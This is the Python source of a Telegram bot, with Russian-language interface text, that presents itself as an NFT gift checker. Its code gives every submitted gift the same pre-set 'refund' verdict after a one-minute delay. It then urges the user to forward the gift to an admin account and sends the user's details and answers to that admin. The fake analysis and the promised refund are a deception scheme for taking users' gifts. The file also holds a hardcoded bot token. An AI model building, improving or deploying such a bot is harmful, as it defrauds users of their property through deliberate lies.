import asyncio
import warnings
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, \
    ConversationHandler, ContextTypes
from telegram.warnings import PTBUserWarning

warnings.filterwarnings("ignore", category=PTBUserWarning)

# ========== НАСТРОЙКИ (ЗАМЕНИТЕ ТОКЕН) ==========
BOT_TOKEN = "8705781672:AAGDPPZ9iYnuWfpbOsWChVws1oqnGBwiBmE"  # ← ВСТАВЬТЕ СВОЙ ТОКЕН
ADMIN_ID = 8347013883  # ← ВАШ ID
ADMIN_USERNAME = "@giftgiveaways_admin"
SUPPORT_BOT = "@giftgiveawayssupportbot"

# ========== ВОПРОСЫ ==========
QUESTIONS = [
    "Когда примерно был создан аккаунт?",
    "Где покупали или у кого покупали подарок?",
    "За какую валюту покупали подарок?",
    "Подарок был куплен у человека или у робота?",
    "Когда примерно был куплен подарок?"
]

# ========== СОСТОЯНИЯ ==========
ASK_LINK, ASK_REF, ASK_Q = range(3)
users = {}


# ========== ГЛАВНОЕ МЕНЮ ==========
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 ПРОВЕРИТЬ ПОДАРОК", callback_data="check")],
        [InlineKeyboardButton("❓ ЧТО ТАКОЕ РЕФАУНД", callback_data="refund")],
        [InlineKeyboardButton("👑 ЗАЧЕМ ПЕРЕДАВАТЬ АДМИНУ?", callback_data="why")],
        [InlineKeyboardButton("🆘 ПОДДЕРЖКА", callback_data="support")],
        [InlineKeyboardButton("ℹ️ О БОТЕ", callback_data="about")]
    ])
    await update.message.reply_text(
        "🎁 GIFT CHECKER\nпроверка подарков\n\n👇 Выберите действие:",
        reply_markup=kb
    )


async def menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "check":
        await q.edit_message_text(
            "🎁 ПРОВЕРКА ПОДАРКА\n\n"
            "Шаг 1 из 7\n\n"
            "Отправьте ссылку на ваш NFT-подарок:\n"
            "Пример: https://t.me/nft/... или https://getgems.io/..."
        )
        return ASK_LINK

    elif data == "refund":
        await q.edit_message_text(
            "🔄 ЧТО ТАКОЕ РЕФАУНД?\n\n"
            "Рефаунд - возврат средств за подарок, который:\n"
            "- не открывается\n"
            "- не пересылается\n"
            "- куплен у мошенников\n\n"
            f"📩 Поддержка: {SUPPORT_BOT}"
        )
        return ConversationHandler.END

    elif data == "why":
        await q.edit_message_text(
            "👑 ЗАЧЕМ ПЕРЕДАВАТЬ АДМИНУ?\n\n"
            "Администратор проверит:\n"
            "- историю транзакций\n"
            "- метаданные подарка\n"
            "- репутацию продавца\n\n"
            "Что вы получите:\n"
            "- возврат за 5 минут\n"
            "- точный диагноз\n"
            "- помощь в спорах\n\n"
            f"👤 {ADMIN_USERNAME}"
        )
        return ConversationHandler.END

    elif data == "support":
        await q.edit_message_text(
            "🆘 ПОДДЕРЖКА\n\n"
            f"🤖 Бот: {SUPPORT_BOT}\n"
            f"👑 Админ: {ADMIN_USERNAME}\n\n"
            "Время ответа: до 5 минут\n"
            "В сообщении укажите ссылку на подарок и ваш ник."
        )
        return ConversationHandler.END

    elif data == "about":
        await q.edit_message_text(
            "ℹ️ О БОТЕ\n\n"
            "Gift Checker v3.0\n"
            "Анализирует подарки по 5 критериям.\n\n"
            f"📩 По вопросам: {SUPPORT_BOT}"
        )
        return ConversationHandler.END
    return ConversationHandler.END


# ========== ОПРОС ==========
async def get_link(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    users[uid] = {
        "link": update.message.text,
        "answers": [],
        "idx": 0,
        "chat_id": update.effective_chat.id,
        "username": update.effective_user.username or str(uid)
    }
    await update.message.reply_text(
        "✅ Ссылка принята!\n\n"
        "Шаг 2 из 7\n\n"
        "Укажите username человека, от которого вы пришли:"
    )
    return ASK_REF


async def get_ref(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in users:
        await update.message.reply_text("Ошибка. Нажмите /start")
        return ConversationHandler.END
    users[uid]["ref"] = update.message.text.strip().lstrip('@')
    await update.message.reply_text(
        f"✅ Реферер: @{users[uid]['ref']}\n\n"
        f"Шаг 3 из {len(QUESTIONS) + 2}\n\n"
        f"Вопрос 1/{len(QUESTIONS)}:\n{QUESTIONS[0]}\n\n"
        f"Отправьте ответ:"
    )
    return ASK_Q


async def handle_q(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in users:
        await update.message.reply_text("Ошибка. /start")
        return ConversationHandler.END
    u = users[uid]
    idx = u["idx"]
    u["answers"].append({"q": QUESTIONS[idx], "a": update.message.text})

    if idx + 1 < len(QUESTIONS):
        u["idx"] += 1
        await update.message.reply_text(
            f"✅ Принято!\n\n"
            f"Вопрос {idx + 2}/{len(QUESTIONS)}:\n{QUESTIONS[idx + 1]}\n\n"
            f"Отправьте ответ:"
        )
        return ASK_Q
    else:
        await update.message.reply_text(
            "📋 ЗАЯВКА ПРИНЯТА\n\n"
            "✅ Спасибо! Ваши данные переданы.\n"
            "⏳ Через 1 минуту вы получите вердикт."
        )
        asyncio.create_task(send_verdict(uid, ctx))
        return ConversationHandler.END


async def send_verdict(uid, ctx):
    await asyncio.sleep(60)
    if uid not in users:
        return
    u = users[uid]

    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🆘 НАПИСАТЬ В ПОДДЕРЖКУ", url=f"https://t.me/{SUPPORT_BOT[1:]}")]
    ])

    verdict = (
        "🔴 ВЕРДИКТ БОТА 🔴\n\n"
        "ВНИМАНИЕ! Данный подарок является РЕФАУНДОМ!\n\n"
        "Что нужно сделать:\n"
        "1. Перешлите этот подарок админу:\n"
        f"   {ADMIN_USERNAME}\n"
        "2. Обязательно укажите хэштег:\n"
        "   #проверкарефаунда\n"
        "3. Дождитесь ответа (3-5 минут)\n\n"
        "Если вы НЕ СОГЛАСНЫ с решением бота,\n"
        "напишите в поддержку:"
    )

    await ctx.bot.send_message(chat_id=u["chat_id"], text=verdict, reply_markup=kb)

    # Отправка админу
    answers_text = "\n".join([f"{i + 1}. {a['q']}\n   -> {a['a']}" for i, a in enumerate(u["answers"])])
    admin_msg = (
        f"#проверкарефаунда\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"НОВЫЙ РЕФАУНД-ПОДАРОК\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Ссылка: {u['link']}\n"
        f"От: @{u['username']}\n"
        f"Реферер: @{u['ref']}\n"
        f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"ОТВЕТЫ:\n{answers_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Вердикт: РЕФАУНД"
    )
    await ctx.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    del users[uid]


async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in users:
        del users[uid]
    await update.message.reply_text("❌ Опрос отменён. /start для возврата в меню")


async def admin_reply(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = ctx.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /reply @username текст")
        return
    target = args[0].lstrip('@')
    text = " ".join(args[1:])
    for uid, data in users.items():
        if data["username"] == target:
            await ctx.bot.send_message(
                chat_id=data["chat_id"],
                text=f"👑 ОТВЕТ АДМИНИСТРАТОРА:\n\n{text}\n\n/start для возврата в меню"
            )
            await update.message.reply_text(f"✅ Отправлено @{target}")
            return
    await update.message.reply_text(f"❌ @{target} не найден")


# ========== ЗАПУСК ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(menu, pattern="^check$")],
        states={
            ASK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],
            ASK_REF: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ref)],
            ASK_Q: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_q)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(menu, pattern="^(refund|why|support|about)$"))
    app.add_handler(conv)
    app.add_handler(CommandHandler("reply", admin_reply))

    print("✅ Бот ЗАПУЩЕН")
    print(f"👑 Админ: {ADMIN_USERNAME}")
    print(f"🆘 Поддержка: {SUPPORT_BOT}")
    print("Напишите /start в Telegram")

    app.run_polling()


if __name__ == "__main__":
    main()